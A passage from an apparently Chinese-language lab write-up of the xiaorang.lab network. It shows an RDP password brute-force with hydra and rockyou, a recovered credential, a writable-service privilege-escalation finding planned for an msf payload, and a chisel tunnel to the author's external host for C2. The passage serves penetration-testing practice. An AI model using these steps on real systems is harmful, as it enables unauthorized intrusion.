class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> NetBios: </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45     XIAORANG</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">WIN19</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> NetInfo:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">WIN19</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Windows Server </span><span class="token number" style="color:#36acaa">2016</span><span class="token plain"> Datacenter </span><span class="token number" style="color:#36acaa">14393</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> NetBios: </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19     FILESERVER.xiaorang.lab             Windows Server </span><span class="token number" style="color:#36acaa">2016</span><span class="token plain"> Standard </span><span class="token number" style="color:#36acaa">14393</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle: http://172.22.4.36        code:200 len:68100  title: 中文网页标题</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="17222445-xiaorangwin19-rdp-密码爆破">172.22.4.45 XIAORANG\WIN19 RDP 密码爆破<a href="#17222445-xiaorangwin19-rdp-密码爆破" class="hash-link" aria-label="172.22.4.45 XIAORANG\WIN19 RDP 密码爆破的直接链接" title="172.22.4.45 XIAORANG\WIN19 RDP 密码爆破的直接链接">​</a></h2>
<p>根据 <code>flag - 02</code> 中提供的信息</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Here is the hint: WIN19\Adrian</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I&#x27;ll do whatever I can to rock you...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以确定用户为 <code>WIN19\Adrian</code> 并且密码字典为 <code>rockyou.txt</code></p>
<p>尝试进行 RDP 爆破</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 </span><span class="token parameter variable" style="color:#36acaa">-q</span><span class="token plain"> hydra </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Adrian&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-P</span><span class="token plain"> /usr/share/wordlists/rockyou.txt rdp://172.22.4.45 </span><span class="token parameter variable" style="color:#36acaa">-vV</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ATTEMPT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45 - login </span><span class="token string" style="color:#e3116c">&quot;Adrian&quot;</span><span class="token plain"> - pass </span><span class="token string" style="color:#e3116c">&quot;babygirl1&quot;</span><span class="token plain"> - </span><span class="token number" style="color:#36acaa">219</span><span class="token plain"> of </span><span class="token number" style="color:#36acaa">14344399</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">child </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token plain">/0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ERROR</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> freerdp: The password has expired and must be changed. </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">0x0002000e</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RE-ATTEMPT</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45 - login </span><span class="token string" style="color:#e3116c">&quot;Adrian&quot;</span><span class="token plain"> - pass </span><span class="token string" style="color:#e3116c">&quot;babygirl1&quot;</span><span class="token plain"> - </span><span class="token number" style="color:#36acaa">223</span><span class="token plain"> of </span><span class="token number" style="color:#36acaa">14344399</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">child </span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token plain">/0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">ERROR</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> freerdp: The password has expired and must be changed. </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">0x0002000e</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>得到一个密码过期的凭据 <code>Adrian:babygirl1</code></p>
<p>尝试进行连接</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240707-090703-6bcc2ddaa318af33a264d1d42e080a4b.png" width="2014" height="1264" class="img_ev3q"></p>
<p>尝试使用 <code>rdesktop</code> 进行连接</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">randark ㉿ kali</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">~</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ proxychains4 rdesktop </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> config </span><span class="token function" style="color:#d73a49">file</span><span class="token plain"> found: /etc/proxychains4.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> DLL init: proxychains-ng </span><span class="token number" style="color:#36acaa">4.17</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45:3389  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ATTENTION</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"> The server uses and invalid security certificate </span><span class="token function" style="color:#d73a49">which</span><span class="token plain"> can not be trusted </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">the following identified reasons</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">. Certificate issuer is not trusted by this system.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     Issuer: </span><span class="token assign-left variable" style="color:#36acaa">CN</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">WIN19.xiaorang.lab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Review the following certificate info before you trust it to be added as an exception.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If you </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"> not trust the certificate the connection atempt will be aborted:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Subject: </span><span class="token assign-left variable" style="color:#36acaa">CN</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">WIN19.xiaorang.lab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     Issuer: </span><span class="token assign-left variable" style="color:#36acaa">CN</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">WIN19.xiaorang.lab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Valid From: Tue Jul </span><span class="token number" style="color:#36acaa">23</span><span class="token plain"> 08:14:45 </span><span class="token number" style="color:#36acaa">2024</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         To: Wed Jan </span><span class="token number" style="color:#36acaa">22</span><span class="token plain"> 08:14:45 </span><span class="token number" style="color:#36acaa">2025</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Certificate fingerprints:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       sha1: a06ec2425bc2cc6bcda14219c29eeea9535a4e60</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     sha256: b7edffe2d201fb98909e8463b077275ee0bfaaa3809851565cd3e25b421b2590</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Do you trust this certificate </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">yes/no</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">? </span><span class="token function" style="color:#d73a49">yes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Failed to initialize NLA, </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"> you have correct Kerberos TGT initialized ?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">proxychains</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Strict chain  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:10001  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45:3389  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.  OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Core</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">warning</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">: Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection established using SSL.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240711-091147-0dbb4f4f1bde592385c61a353847deea.png" width="2257" height="1372" class="img_ev3q"></p>
<p>修改密码为 <code>Adrian:admin123</code> 之后，即可成功登录</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240713-091308-89528934ad37415ba104f77d5a1a93bd.png" width="2014" height="1264" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="17222445-xiaorangwin19-windows-服务提权">172.22.4.45 XIAORANG\WIN19 Windows 服务提权<a href="#17222445-xiaorangwin19-windows-服务提权" class="hash-link" aria-label="172.22.4.45 XIAORANG\WIN19 Windows 服务提权的直接链接" title="172.22.4.45 XIAORANG\WIN19 Windows 服务提权的直接链接">​</a></h2>
<p>在 <code>C:\Users\Adrian\Desktop\PrivescCheck</code> 桌面上，发现有 <code>PrivescCheck_WIN19.html</code> 文件，也就是 <code>PrivescCheck</code> 提权检测的报告</p>
<p>在其中发现了一条 High 级别的记录</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240716-091617-04327f0194a11e0c332b629346fed179.png" width="2559" height="1371" class="img_ev3q"></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Name              : gupdate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ImagePath         : &quot;C:\Program Files (x86)\Google\Update\GoogleUpdate.exe&quot; /svc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User              : LocalSystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IdentityReference : BUILTIN\Users</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetValue, QueryValue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Status            : Stopped</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UserCanStart      : True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UserCanStop       : True</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以借助此运行 msf 生成的马</p>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>内网靶机没有出网能力，所以需要提前设置好内网 -&gt; 外网的端口转发</p><p>由于服务运行的文件在一段时间之后会自动停止，所以在建立 c2 连接之后，应及时进行进程迁移</p></div></div>
<p>建立内网 -&gt; 外网的端口转发</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">入口点 172.22.4.36</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@localhost:/tmp$ </span><span class="token function" style="color:#d73a49">ifconfig</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eth0: </span><span class="token assign-left variable" style="color:#36acaa">flags</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">416</span><span class="token operator file-descriptor important" style="color:#393A34">3</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">UP,BROADCAST,RUNNING,MULTICAST</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">  mtu </span><span class="token number" style="color:#36acaa">1500</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36  netmask </span><span class="token number" style="color:#36acaa">255.255</span><span class="token plain">.0.0  broadcast </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.255.255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet6 fe80::216:3eff:fe1b:be8a  prefixlen </span><span class="token number" style="color:#36acaa">64</span><span class="token plain">  scopeid 0x2</span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">link</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ether 00:16:3e:1b:be:8a  txqueuelen </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Ethernet</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX packets </span><span class="token number" style="color:#36acaa">166956</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">177580251</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">177.5</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  frame </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX packets </span><span class="token number" style="color:#36acaa">79621</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">28563311</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">28.5</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  carrier </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  collisions </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lo: </span><span class="token assign-left variable" style="color:#36acaa">flags</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7</span><span class="token operator file-descriptor important" style="color:#393A34">3</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">UP,LOOPBACK,RUNNING</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">  mtu </span><span class="token number" style="color:#36acaa">65536</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1  netmask </span><span class="token number" style="color:#36acaa">255.0</span><span class="token plain">.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet6 ::1  prefixlen </span><span class="token number" style="color:#36acaa">128</span><span class="token plain">  scopeid 0x1</span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">host</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        loop  txqueuelen </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Local Loopback</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX packets </span><span class="token number" style="color:#36acaa">15264</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">6538426</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6.5</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  frame </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX packets </span><span class="token number" style="color:#36acaa">15264</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">6538426</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6.5</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  carrier </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  collisions </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@localhost:/tmp$ ./chisel_1.9.1_linux_amd64 client </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:1337 </span><span class="token number" style="color:#36acaa">7777</span><span class="token plain">:7777 </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3495</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 09:23:48 client: Connecting to ws://139.*.*.*:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 09:23:48 client: tun: proxy</span><span class="token comment" style="color:#999988;font-style:italic">#7777=&gt;7777: Listening</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 09:23:48 client: Connected </span><span class="token punctuation" 